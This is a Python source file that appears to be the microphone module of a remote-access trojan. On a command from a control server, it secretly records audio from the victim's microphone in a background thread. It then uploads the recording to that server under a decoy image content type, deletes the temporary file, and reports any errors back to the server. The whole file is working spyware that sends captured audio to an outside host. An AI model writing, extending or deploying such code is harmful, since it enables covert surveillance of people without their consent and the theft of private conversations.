import os
import random
import tempfile
import threading
import requests
import sounddevice as sd
from scipy.io.wavfile import write
from constants import CONTROL


def handle_mic(message):
    split = message.split(" ")
    seconds = int(split[1])
    t = threading.Thread(target=mic_helper, args=[seconds])
    t.start()
    return f"Started audio recording for {seconds}"

def mic_helper(seconds):
    try:
        sd.default.reset()
        fs = 44100 
        
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()

        rn = random.randint(100000, 999999)
        fpath = tempfile.mktemp(prefix=f'op{rn}', suffix=".tmp")
        write(fpath, fs, myrecording)

        with open(fpath, 'rb') as file:
            requests.post(f"{CONTROL}/upload", files={'image': ("testing22.wav", file, 'image/png')})

        os.remove(fpath)

    except Exception as e:
            headers = {'Content-Type': 'text/plain'}
            requests.post(CONTROL, data=f"Failed to send audio: {e}", headers=headers)